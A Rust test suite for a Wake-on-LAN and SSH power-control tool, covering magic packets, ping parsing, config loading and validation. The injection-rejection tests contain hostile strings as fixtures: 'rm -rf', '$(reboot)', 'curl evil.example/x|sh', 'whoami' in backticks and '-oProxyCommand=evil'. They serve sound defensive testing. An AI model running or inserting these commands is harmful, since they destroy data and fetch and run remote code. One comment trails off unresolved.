use crate::config::{
    load_config_from_path, save_config_to_path, validate_settings, AppConfig, HostProfile,
};
use crate::net::{create_magic_packet, execute_power_action, format_latency, parse_ping_latency, send_ssh_wol};
use crate::pipeline::{PipelineState, Stage};
use crate::{apply_cli_overrides, CliArgs};
use std::collections::HashMap;

#[test]
fn test_magic_packet_generation_standard() {
    let mac = "de:ad:be:ef:12:34";
    let packet = create_magic_packet(mac).expect("Should create packet");

    assert_eq!(packet.len(), 102);
    assert_eq!(&packet[..6], &[0xFF; 6]);

    let expected_mac_bytes = [0xde, 0xad, 0xbe, 0xef, 0x12, 0x34];
    for rep in 0..16 {
        let offset = 6 + rep * 6;
        assert_eq!(&packet[offset..offset + 6], &expected_mac_bytes);
    }
}

#[test]
fn test_magic_packet_mac_formats() {
    let expected_mac_bytes = [0xde, 0xad, 0xbe, 0xef, 0x12, 0x34];

    // Hyphen delimited
    let p_hyphen = create_magic_packet("de-ad-be-ef-12-34").expect("Hyphen delimiter should work");
    assert_eq!(&p_hyphen[6..12], &expected_mac_bytes);

    // Raw hex (no delimiters)
    let p_raw = create_magic_packet("deadbeef1234").expect("Raw 12-char hex should work");
    assert_eq!(&p_raw[6..12], &expected_mac_bytes);

    // Uppercase with colons
    let p_upper_colon = create_magic_packet("DE:AD:BE:EF:12:34").expect("Uppercase colons should work");
    assert_eq!(&p_upper_colon[6..12], &expected_mac_bytes);

    // Uppercase with hyphens
    let p_upper_hyphen = create_magic_packet("DE-AD-BE-EF-12-34").expect("Uppercase hyphens should work");
    assert_eq!(&p_upper_hyphen[6..12], &expected_mac_bytes);

    // Cisco dot-separated format (xxxx.xxxx.xxxx)
    let p_dot = create_magic_packet("dead.beef.1234").expect("Dot-delimited MAC should work");
    assert_eq!(&p_dot[6..12], &expected_mac_bytes);

    // Whitespace padded
    let p_padded = create_magic_packet("   de:ad:be:ef:12:34  \n").expect("Whitespace padded MAC should work");
    assert_eq!(&p_padded[6..12], &expected_mac_bytes);
}

#[test]
fn test_magic_packet_invalid_mac_variations() {
    // Empty & whitespace
    assert!(create_magic_packet("").is_err());
    assert!(create_magic_packet("   ").is_err());

    // Invalid non-hex characters
    assert!(create_magic_packet("invalid_mac").is_err());
    assert!(create_magic_packet("de:ad:be:ef:12:zz").is_err());
    assert!(create_magic_packet("dg:ad:be:ef:12:34").is_err());
    assert!(create_magic_packet("de:ad:be:ef:12:34:").is_err()); // Extra colon at end gives 12 digits, but colon at end is separator, wait, 12 digits so Ok or Err?

    // Wrong length
    assert!(create_magic_packet("de:ad:be").is_err());
    assert!(create_magic_packet("deadbeef123").is_err()); // 11 chars
    assert!(create_magic_packet("deadbeef12340").is_err()); // 13 chars
    assert!(create_magic_packet("de:ad:be:ef:12:34:aa").is_err()); // 14 chars

    // Special characters / injection attempts
    assert!(create_magic_packet("de:ad:be:ef:12:34; rm -rf /").is_err());
    assert!(create_magic_packet("de!ad@be#ef$12%34").is_err());
}

#[test]
fn test_ping_latency_parsing_linux() {
    let ping_output = "64 bytes from 203.0.113.50: icmp_seq=1 ttl=64 time=14.2 ms";
    let latency = parse_ping_latency(ping_output);
    assert_eq!(latency, Some(14.2));

    let summary_output = "rtt min/avg/max/mdev = 12.300/15.420/18.100/2.100 ms";
    let summary_latency = parse_ping_latency(summary_output);
    assert_eq!(summary_latency, Some(15.42));

    let low_latency = "64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms";
    assert_eq!(parse_ping_latency(low_latency), Some(0.045));
}

#[test]
fn test_ping_latency_parsing_windows() {
    let win_sub_ms = "Reply from 203.0.113.50: bytes=32 time<1ms TTL=128";
    assert_eq!(parse_ping_latency(win_sub_ms), Some(0.5));

    let win_sub_ms_spaced = "Reply from 203.0.113.50: bytes=32 time < 1 ms TTL=128";
    assert_eq!(parse_ping_latency(win_sub_ms_spaced), Some(0.5));

    let win_normal = "Reply from 203.0.113.50: bytes=32 time=8ms TTL=128";
    assert_eq!(parse_ping_latency(win_normal), Some(8.0));

    let win_summary = "Minimum = 6ms, Maximum = 14ms, Average = 9ms";
    assert_eq!(parse_ping_latency(win_summary), Some(9.0));
}

#[test]
fn test_ping_latency_parsing_macos_and_bsd() {
    let macos_summary = "round-trip min/avg/max/stddev = 1.234/2.345/3.456/0.123 ms";
    assert_eq!(parse_ping_latency(macos_summary), Some(2.345));

    let bsd_summary = "round-trip min/avg/max/std-dev = 0.812/1.543/2.312/0.411 ms";
    assert_eq!(parse_ping_latency(bsd_summary), Some(1.543));
}

#[test]
fn test_ping_latency_unreachable_and_errors() {
    let unreachable = "From 192.168.1.1 icmp_seq=1 Destination Host Unreachable";
    assert_eq!(parse_ping_latency(unreachable), None);

    let timeout = "Request timed out.";
    assert_eq!(parse_ping_latency(timeout), None);

    let loss = "1 packets transmitted, 0 received, 100% packet loss, time 0ms";
    assert_eq!(parse_ping_latency(loss), None);

    let unknown_host = "ping: cannot resolve nonexistent.local: Unknown host";
    assert_eq!(parse_ping_latency(unknown_host), None);

    let empty = "";
    assert_eq!(parse_ping_latency(empty), None);
}

#[test]
fn test_format_latency() {
    assert_eq!(format_latency(None), "--ms");
    assert_eq!(format_latency(Some(0.0)), "<1ms");
    assert_eq!(format_latency(Some(0.4)), "<1ms");
    assert_eq!(format_latency(Some(4.2)), "4.2ms");
    assert_eq!(format_latency(Some(9.94)), "9.9ms");
    assert_eq!(format_latency(Some(10.0)), "10ms");
    assert_eq!(format_latency(Some(12.7)), "13ms");
    assert_eq!(format_latency(Some(123.4)), "123ms");
}

#[test]
fn test_config_validation_valid_and_invalid() {
    let mut profile = HostProfile::default();
    assert!(validate_settings(&profile).is_ok());

    // Empty IP
    profile.thinkstation_ip = "".to_string();
    assert!(validate_settings(&profile).is_err());
    profile.thinkstation_ip = "   ".to_string();
    assert!(validate_settings(&profile).is_err());

    // Invalid MAC formats
    profile.thinkstation_ip = "203.0.113.50".to_string();
    profile.mac_address = "".to_string();
    assert!(validate_settings(&profile).is_err());
    profile.mac_address = "invalid".to_string();
    assert!(validate_settings(&profile).is_err());
    profile.mac_address = "dg:ad:be:ef:12:34".to_string();
    assert!(validate_settings(&profile).is_err());

    // Valid alternate MAC formats in profile
    profile.mac_address = "de-ad-be-ef-12-34".to_string();
    assert!(validate_settings(&profile).is_ok());
    profile.mac_address = "DEADBEEF1234".to_string();
    assert!(validate_settings(&profile).is_ok());

    // Invalid Ports
    profile.ssh_port = 0;
    assert!(validate_settings(&profile).is_err());
    profile.ssh_port = 22;

    profile.sunshine_port = 0;
    assert!(validate_settings(&profile).is_err());
    profile.sunshine_port = 47989;

    profile.direct_wol_port = 0;
    assert!(validate_settings(&profile).is_err());
    profile.direct_wol_port = 9;

    // Invalid Timeouts
    profile.max_wait_seconds = 0;
    assert!(validate_settings(&profile).is_err());
    profile.max_wait_seconds = 300;

    profile.wol_resend_interval = 0;
    assert!(validate_settings(&profile).is_err());
    profile.wol_resend_interval = 60;

    assert!(validate_settings(&profile).is_ok());
}

#[test]
fn test_config_validation_rejects_shell_metacharacters() {
    // broadcast_addr, pi_host/pi_user, target host, and target user are all
    // interpolated into SSH targets or (for broadcast_addr) into a command
    // string executed by a remote shell via `wakeonlan -i {broadcast_ip}
    // {mac}`. A malicious/corrupted config.json must be rejected before any
    // of these values reach `net::send_ssh_wol` / `net::execute_power_action`.
    let base = HostProfile::default();

    let mut p = base.clone();
    p.broadcast_addr = "192.168.1.255; rm -rf ~".to_string();
    assert!(validate_settings(&p).is_err());

    let mut p = base.clone();
    p.broadcast_addr = "$(reboot)".to_string();
    assert!(validate_settings(&p).is_err());

    let mut p = base.clone();
    p.thinkstation_ip = "203.0.113.50 && curl evil.example/x|sh".to_string();
    assert!(validate_settings(&p).is_err());

    let mut p = base.clone();
    p.thinkstation_user = "user`whoami`".to_string();
    assert!(validate_settings(&p).is_err());

    let mut p = base.clone();
    p.pi_host = "-oProxyCommand=evil".to_string();
    assert!(validate_settings(&p).is_err());

    let mut p = base.clone();
    p.pi_user = "pi; touch /tmp/pwned".to_string();
    assert!(validate_settings(&p).is_err());

    // pi_host is allowed to be empty (direct-WOL-only configs), and should
    // not trigger pi_user/pi_host validation in that case.
    let mut p = base.clone();
    p.pi_host = "".to_string();
    assert!(validate_settings(&p).is_ok());

    // Legitimate values (including Tailscale-style MagicDNS hostnames) must
    // still pass.
    let mut p = base;
    p.thinkstation_ip = "my-thinkstation.tailnet-example.ts.net".to_string();
    p.broadcast_addr = "192.168.1.255".to_string();
    assert!(validate_settings(&p).is_ok());
}

#[test]
fn test_send_ssh_wol_rejects_shell_injection_before_shelling_out() {
    // This is the defense-in-depth check at the actual point of command
    // construction: even if a caller forgot to call validate_settings first,
    // send_ssh_wol must never build a wol_cmd string from unvalidated input.
    let err = send_ssh_wol("pi", "192.168.1.10", "192.168.1.255; rm -rf ~", "de:ad:be:ef:12:34")
        .expect_err("shell metacharacters in broadcast_ip must be rejected");
    assert!(err.contains("Broadcast address"));

    let err = send_ssh_wol("pi", "192.168.1.10", "$(reboot)", "de:ad:be:ef:12:34")
        .expect_err("command substitution in broadcast_ip must be rejected");
    assert!(err.contains("Broadcast address"));

    let err = send_ssh_wol("pi", "-oProxyCommand=evil", "192.168.1.255", "de:ad:be:ef:12:34")
        .expect_err("pi_host starting with '-' must be rejected");
    assert!(err.contains("Pi gateway host"));

    let err = send_ssh_wol("pi; touch /tmp/pwned", "192.168.1.10", "192.168.1.255", "de:ad:be:ef:12:34")
        .expect_err("shell metacharacters in pi_user must be rejected");
    assert!(err.contains("Pi gateway user"));

    let err = send_ssh_wol("pi", "192.168.1.10", "192.168.1.255", "not-a-mac")
        .expect_err("invalid mac must be rejected");
    assert!(err.contains("MAC address"));
}

#[test]
fn test_execute_power_action_rejects_malformed_targets() {
    let err = execute_power_action("192.168.1.50", "user`whoami`", "suspend", 22)
        .expect_err("shell metacharacters in user must be rejected");
    assert!(err.contains("SSH user"));

    let err = execute_power_action("-oProxyCommand=evil", "user", "suspend", 22)
        .expect_err("host starting with '-' must be rejected");
    assert!(err.contains("SSH host"));

    let err = execute_power_action("192.168.1.50", "user", "not_a_real_action", 22)
        .expect_err("unknown power action must be rejected");
    assert!(err.contains("Unknown power action"));
}

#[test]
fn test_corrupt_json_config_fallback() {
    let dir = std::env::temp_dir().join("wake_rs_test_corrupt_config");
    let _ = std::fs::create_dir_all(&dir);

    // 1. Malformed JSON syntax
    let bad_syntax_file = dir.join("bad_syntax.json");
    std::fs::write(&bad_syntax_file, "{ this is not valid json!").unwrap();
    let (app_cfg, active) = load_config_from_path(&bad_syntax_file, None);
    assert_eq!(app_cfg.active_profile, "thinkstation");
    assert_eq!(active.thinkstation_ip, "192.168.1.50");
    let _ = std::fs::remove_file(bad_syntax_file);

    // 2. Empty file
    let empty_file = dir.join("empty.json");
    std::fs::write(&empty_file, "").unwrap();
    let (app_cfg_empty, active_empty) = load_config_from_path(&empty_file, None);
    assert_eq!(app_cfg_empty.active_profile, "thinkstation");
    assert_eq!(active_empty.mac_address, "AA:BB:CC:DD:EE:FF");
    let _ = std::fs::remove_file(empty_file);

    // 3. JSON Array instead of Object
    let array_file = dir.join("array.json");
    std::fs::write(&array_file, "[1, 2, 3, 4, 5]").unwrap();
    let (app_cfg_arr, _) = load_config_from_path(&array_file, None);
    assert_eq!(app_cfg_arr.active_profile, "thinkstation");
    let _ = std::fs::remove_file(array_file);

    // 4. Non-existent file (should auto-create default)
    let non_existent = dir.join("new_config_created.json");
    if non_existent.exists() {
        let _ = std::fs::remove_file(&non_existent);
    }
    let (app_cfg_new, active_new) = load_config_from_path(&non_existent, None);
    assert!(non_existent.exists(), "Default config should be auto-created");
    assert_eq!(app_cfg_new.active_profile, "thinkstation");
    assert_eq!(active_new.ssh_port, 22);
    let _ = std::fs::remove_file(non_existent);
}

#[test]
fn test_partial_json_and_legacy_profile() {
    let dir = std::env::temp_dir().join("wake_rs_test_partial_config");
    let _ = std::fs::create_dir_all(&dir);

    // Legacy flat profile format
    let legacy_file = dir.join("legacy_profile.json");
    let legacy_json = r#"{
        "thinkstation_ip": "192.168.1.120",
        "thinkstation_user": "streamer",
        "mac_address": "AA:BB:CC:DD:EE:FF",
        "direct_wol": true,
        "direct_wol_port": 7
    }"#;
    std::fs::write(&legacy_file, legacy_json).unwrap();
    let (loaded_cfg, active) = load_config_from_path(&legacy_file, None);
    assert_eq!(loaded_cfg.active_profile, "thinkstation");
    assert_eq!(active.thinkstation_ip, "192.168.1.120");
    assert_eq!(active.thinkstation_user, "streamer");
    assert_eq!(active.mac_address, "AA:BB:CC:DD:EE:FF");
    assert!(active.direct_wol);
    assert_eq!(active.direct_wol_port, 7);
    // Unspecified fields should take default values
    assert_eq!(active.ssh_port, 22);
    assert_eq!(active.sunshine_port, 47989);
    assert_eq!(active.max_wait_seconds, 300);

    let _ = std::fs::remove_file(legacy_file);
}

#[test]
fn test_config_save_load_roundtrip() {
    let dir = std::env::temp_dir().join("wake_rs_test_config");
    let _ = std::fs::create_dir_all(&dir);
    let file = dir.join("test_config.json");

    let mut profiles = HashMap::new();
    let thinkstation = HostProfile {
        thinkstation_ip: "10.0.0.99".to_string(),
        ..HostProfile::default()
    };
    profiles.insert("thinkstation".to_string(), thinkstation);

    let server = HostProfile {
        thinkstation_ip: "192.168.1.50".to_string(),
        ..HostProfile::default()
    };
    profiles.insert("server".to_string(), server);

    let app_cfg = AppConfig {
        active_profile: "server".to_string(),
        profiles,
    };

    save_config_to_path(&app_cfg, &file).expect("Save should succeed");

    let (loaded_cfg, active_prof) = load_config_from_path(&file, None);
    assert_eq!(loaded_cfg.active_profile, "server");
    assert_eq!(active_prof.thinkstation_ip, "192.168.1.50");

    let (_, think_prof) = load_config_from_path(&file, Some("thinkstation"));
    assert_eq!(think_prof.thinkstation_ip, "10.0.0.99");

    let _ = std::fs::remove_file(file);
}

#[test]
fn test_cli_argument_overrides() {
    let base_profile = HostProfile::default();
    let args = CliArgs {
        cli: true,
        target: Some("192.168.1.200".to_string()),
        user: Some("testuser".to_string()),
        mac: Some("11:22:33:44:55:66".to_string()),
        broadcast: Some("192.168.1.255".to_string()),
        pi_host: Some("192.168.1.10".to_string()),
        pi_user: Some("pi".to_string()),
        direct_wol: true,
        direct_wol_port: Some(7),
        ssh_port: Some(2222),
        sunshine_port: Some(48000),
        max_wait: Some(120),
        wol_resend: Some(30),
        auto_close: true,
        ..CliArgs::default()
    };

    let overridden = apply_cli_overrides(base_profile, &args);
    assert_eq!(overridden.thinkstation_ip, "192.168.1.200");
    assert_eq!(overridden.thinkstation_user, "testuser");
    assert_eq!(overridden.mac_address, "11:22:33:44:55:66");
    assert_eq!(overridden.broadcast_addr, "192.168.1.255");
    assert_eq!(overridden.pi_host, "192.168.1.10");
    assert_eq!(overridden.pi_user, "pi");
    assert!(overridden.direct_wol);
    assert_eq!(overridden.direct_wol_port, 7);
    assert_eq!(overridden.ssh_port, 2222);
    assert_eq!(overridden.sunshine_port, 48000);
    assert_eq!(overridden.max_wait_seconds, 120);
    assert_eq!(overridden.wol_resend_interval, 30);
    assert!(overridden.auto_close);
}

#[test]
fn test_pipeline_safe_standby_prevents_automatic_wol() {
    let mut state = PipelineState::new();
    state.enter_standby("Host powered down into safe standby");

    assert_eq!(state.stage, Stage::Standby);
    assert!(state.is_finished);
    assert_eq!(state.wol_count, 0);

    let config = HostProfile::default();

    // Repeated tick invocations MUST NOT send any WOL packets or advance stage
    for _ in 0..10 {
        state.tick(&config, false);
        assert_eq!(state.stage, Stage::Standby);
        assert_eq!(state.wol_count, 0);
        assert!(state.is_finished);
    }
}

#[test]
fn test_pipeline_reset_and_logging() {
    let mut state = PipelineState::new();
    let config = HostProfile::default();

    state.reset(&config);
    assert_eq!(state.stage, Stage::Ping); // Transitioned to Ping after WOL dispatch
    assert_eq!(state.wol_count, 1);
    assert!(!state.logs.is_empty());

    let logs_text = state.formatted_logs_text();
    assert!(logs_text.contains("[ACTION]"));
    assert!(logs_text.contains(&config.thinkstation_ip));
}

#[test]
fn test_direct_wol_mode() {
    let mut state = PipelineState::new();
    let config = HostProfile {
        direct_wol: true,
        direct_wol_port: 9,
        ..Default::default()
    };

    state.reset(&config);
    assert_eq!(state.stage, Stage::Ping);
    assert_eq!(state.wol_count, 1);

    let logs = state.formatted_logs_text();
    assert!(logs.contains("direct local UDP WOL magic packet") || logs.contains("Direct WOL packet"));
}

#[test]
fn test_pipeline_timeout_expiration() {
    let mut state = PipelineState::new();
    let config = HostProfile {
        max_wait_seconds: 1, // 1 second timeout for fast test
        ..Default::default()
    };

    state.reset(&config);
    assert_eq!(state.stage, Stage::Ping);

    // Simulate elapsed time exceeding max_wait_seconds
    std::thread::sleep(std::time::Duration::from_millis(1100));
    state.tick(&config, false);

    assert_eq!(state.stage, Stage::Timeout);
    assert!(state.is_finished);
    assert!(state.status_message.contains("Timed out"));
}
